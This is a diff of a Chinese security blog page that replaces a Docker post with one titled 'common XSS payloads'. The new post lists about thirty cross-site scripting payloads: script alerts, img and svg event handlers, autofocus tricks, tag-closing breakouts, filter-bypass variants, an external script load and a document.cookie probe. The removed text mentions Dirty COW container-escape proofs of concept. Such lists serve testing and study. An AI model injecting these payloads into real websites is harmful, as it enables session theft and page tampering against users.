@@ -71,7 +71,7 @@
 <link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="docker," />
+  <meta name="keywords" content="web安全,xss," />
 
 
 
@@ -89,16 +89,19 @@
 
 
 
-<meta name="description" content="docker&amp;#160; &amp;#160; &amp;#160; &amp;#160;醉了，今天研究了一天的docker，我就不该让它运行在windows中，这是个错误啊，各种配置问题，各种解决。最后只汇聚成了一句精华1dm   -s &amp;quot;D:\docker list&amp;quot;   create --engine-registry-mirror=https://docker.mirrors.ustc.ed">
+<meta name="description" content="xss前几天整理了下xss相关的东西，所以记录下常用的payload
+整理的payload123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263&amp;lt;img src=1&amp;gt;&amp;lt;script&amp;gt;alert(">
 <meta property="og:type" content="article">
-<meta property="og:title" content="docker">
-<meta property="og:url" content="http://phpplay.github.io/2017/03/20/docker/index.html">
+<meta property="og:title" content="xss常用payload">
+<meta property="og:url" content="http://phpplay.github.io/2017/03/30/xss/index.html">
 <meta property="og:site_name" content="masker">
-<meta property="og:description" content="docker&amp;#160; &amp;#160; &amp;#160; &amp;#160;醉了，今天研究了一天的docker，我就不该让它运行在windows中，这是个错误啊，各种配置问题，各种解决。最后只汇聚成了一句精华1dm   -s &amp;quot;D:\docker list&amp;quot;   create --engine-registry-mirror=https://docker.mirrors.ustc.ed">
-<meta property="og:updated_time" content="2017-03-21T03:23:33.445Z">
+<meta property="og:description" content="xss前几天整理了下xss相关的东西，所以记录下常用的payload
+整理的payload123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263&amp;lt;img src=1&amp;gt;&amp;lt;script&amp;gt;alert(">
+<meta property="og:updated_time" content="2017-03-30T04:30:25.239Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="docker">
-<meta name="twitter:description" content="docker&amp;#160; &amp;#160; &amp;#160; &amp;#160;醉了，今天研究了一天的docker，我就不该让它运行在windows中，这是个错误啊，各种配置问题，各种解决。最后只汇聚成了一句精华1dm   -s &amp;quot;D:\docker list&amp;quot;   create --engine-registry-mirror=https://docker.mirrors.ustc.ed">
+<meta name="twitter:title" content="xss常用payload">
+<meta name="twitter:description" content="xss前几天整理了下xss相关的东西，所以记录下常用的payload
+整理的payload123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263&amp;lt;img src=1&amp;gt;&amp;lt;script&amp;gt;alert(">
 
 
 
@@ -126,13 +129,13 @@
 
 
 
-  <link rel="canonical" href="http://phpplay.github.io/2017/03/20/docker/"/>
+  <link rel="canonical" href="http://phpplay.github.io/2017/03/30/xss/"/>
 
 
 
 
 
-  <title> docker | masker </title>
+  <title> xss常用payload | masker </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -251,7 +254,7 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://phpplay.github.io/2017/03/20/docker/">
+    <link itemprop="mainEntityOfPage" href="http://phpplay.github.io/2017/03/30/xss/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="masker">
@@ -272,7 +275,7 @@
             
             
               
-                docker
+                xss常用payload
               
             
           </h1>
@@ -287,8 +290,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-03-20T16:27:53+08:00">
-                2017-03-20
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-03-30T12:20:56+08:00">
+                2017-03-30
               </time>
             
 
@@ -323,12 +326,8 @@
       
 
       
-        <script src="/assets/js/APlayer.min.js"> </script><h2 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h2><p>&#160; &#160; &#160; &#160;醉了，今天研究了一天的docker，我就不该让它运行在windows中，这是个错误啊，各种配置问题，各种解决。最后只汇聚成了一句精华<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">dm   -s &quot;D:\docker list&quot;   create --engine-registry-mirror=https://docker.mirrors.ustc.edu.cn --virtualbox-hostonly-cidr &quot;192.168.233.1/24&quot; -d virtualbox  xxx</div></pre></td></tr></table></figure></p>
-<p>&#160; &#160; &#160; &#160;PS:老版本的docker真心不好用，其实原理就是简易的vbox么。</p>
-<h2 id="docker漏洞相关"><a href="#docker漏洞相关" class="headerlink" title="docker漏洞相关"></a>docker漏洞相关</h2><p>现在的docker虚拟化才兴起，所以漏洞还是有一些的，找到一个相关的<a href="http://www.cnblogs.com/hanyifeng/p/5526799.html" target="_blank" rel="external">漏洞</a>，虚拟化这一片的洞也不少啊，还有就是git上有一些，比如CVE-2016-5195,都是用来逃逸的POC</p>
-<p>代码git上就有<a href="https://github.com/gebl/dirtycow-docker-vdso" target="_blank" rel="external">code</a>.</p>
-<h2 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h2><p>&#160; &#160; &#160; &#160;它最大的有点就是方便，各种环境的开解部署，真心快。</p>
-
+        <script src="/assets/js/APlayer.min.js"> </script><h2 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h2><p>前几天整理了下xss相关的东西，所以记录下常用的payload</p>
+<h2 id="整理的payload"><a href="#整理的payload" class="headerlink" title="整理的payload"></a>整理的payload</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div></pre></td><td class="code"><pre><div class="line">&lt;img src=1&gt;</div><div class="line"></div><div class="line">&lt;script&gt;alert(1);&lt;/script&gt;</div><div class="line"></div><div class="line">&lt;iframe width=&quot;100&quot; height=&quot;100&quot; src=&quot;http://baidu.com&quot;&gt;&lt;/iframe&gt;</div><div class="line"></div><div class="line">&lt;SCRIPT SRC=http://baidu.com/xss.js&gt;&lt;/SCRIPT&gt;</div><div class="line"></div><div class="line">&lt;img src=x onerror=alert(&apos;t&apos;)&gt;     单引号</div><div class="line"></div><div class="line">&lt;img src=&quot;1&quot; onerror=&quot;alert(1)&quot;&gt;    双引号</div><div class="line"></div><div class="line">&lt;img src=1 onerror=alert(1);&gt;    分号</div><div class="line"></div><div class="line">&lt;img src=x onerror=alert(1)&gt;     </div><div class="line"></div><div class="line">&lt;svg/onload=alert(1)&gt;</div><div class="line"></div><div class="line">&lt;svg/onload=alert(1)&gt;;</div><div class="line"></div><div class="line">&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;&lt;g onload=&quot;javascript:alert(1)&quot;&gt;&lt;/g&gt;&lt;/svg&gt;      svg</div><div class="line"></div><div class="line">&lt;input onfocus=write(1) autofocus&gt;       </div><div class="line"></div><div class="line">&lt;input onfocus=adlert(1) autofocus&gt;</div><div class="line"></div><div class="line">&lt;video onerror=”javascript：alert(1)”&gt;&lt;source&gt;</div><div class="line"></div><div class="line">&lt;img src=&quot;pic.gif&quot; onerror=&quot;alert(&apos;1&apos;)&quot;</div><div class="line"></div><div class="line">&lt;img src=&quot;pic.gif&quot; onerror=&quot;alert(&apos;1&apos;)&quot; alt=&quot;test&quot; title=&quot;test1&quot; onclick=&quot;alert(&apos;2&apos;)&quot;&gt;</div><div class="line"></div><div class="line">&lt;img src=x.jpg onerror=alert(document.cookie)&gt;</div><div class="line"></div><div class="line">&lt;video&gt;&lt;source onerror=&quot;alert(1)&quot;&gt;</div><div class="line"></div><div class="line">&lt;body onscroll=alert(1)&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;...&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;input autofocus&gt;</div><div class="line"></div><div class="line">&lt;img src=x onerror=alert(1)&gt;</div><div class="line"></div><div class="line">&lt;video onerror=”javascript：alert(1)”&gt;&lt;source&gt;</div><div class="line"></div><div class="line">&lt;keygen autofocus onfocus=alert(1)&gt;</div><div class="line"></div><div class="line">&lt;select autofocus onfocus=alert(1)&gt;</div><div class="line"></div><div class="line">&lt;input onfocus=write(1) autofocus&gt;      chrome</div><div class="line"></div><div class="line">&quot;&gt;&lt;script src=data:,alert(1)&lt;!--    绕过浏览器</div><div class="line"></div><div class="line">常见闭合</div><div class="line">&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</div><div class="line"></div><div class="line">&apos;&gt;&lt;/title&gt;&lt;script&gt;alert(1111)&lt;/script&gt;</div><div class="line"></div><div class="line">&quot;&gt;&lt;script&gt;alert(1111)&lt;/script&gt;</div><div class="line"></div><div class="line">一些变形</div><div class="line">&lt;/script&gt;&lt;script&gt;alert(String.from+CharCode(88,%2083,%2083))&lt;/script&gt;</div><div class="line"></div><div class="line">&lt;scr&lt;script&gt;ipt&gt;alert(&apos;XSS&apos;);&lt;/scr&lt;/script&gt;ipt&gt;</div><div class="line"></div><div class="line">iimgmg</div></pre></td></tr></table></figure>
       
     </div>
 
@@ -357,7 +356,9 @@
       
         <div class="post-tags">
           
-            <a href="/tags/docker/" rel="tag"># docker</a>
+            <a href="/tags/web安全/" rel="tag"># web安全</a>
+          
+            <a href="/tags/xss/" rel="tag"># xss</a>
           
         </div>
       
@@ -370,8 +371,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/03/16/hexo/" rel="next" title="hexo">
-                <i class="fa fa-chevron-left"></i> hexo
+              <a href="/2017/03/28/10年/" rel="next" title="10年">
+                <i class="fa fa-chevron-left"></i> 10年
               </a>
             
           </div>
@@ -379,10 +380,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2017/03/21/dockerbj/" rel="prev" title="docker笔记">
-                docker笔记 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -509,7 +506,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#docker"><span class="nav-number">1.</span> <span class="nav-text">docker</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#docker漏洞相关"><span class="nav-number">2.</span> <span class="nav-text">docker漏洞相关</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#优点"><span class="nav-number">3.</span> <span class="nav-text">优点</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#xss"><span class="nav-number">1.</span> <span class="nav-text">xss</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#整理的payload"><span class="nav-number">2.</span> <span class="nav-text">整理的payload</span></a></li></ol></div>
             
 
           </div>
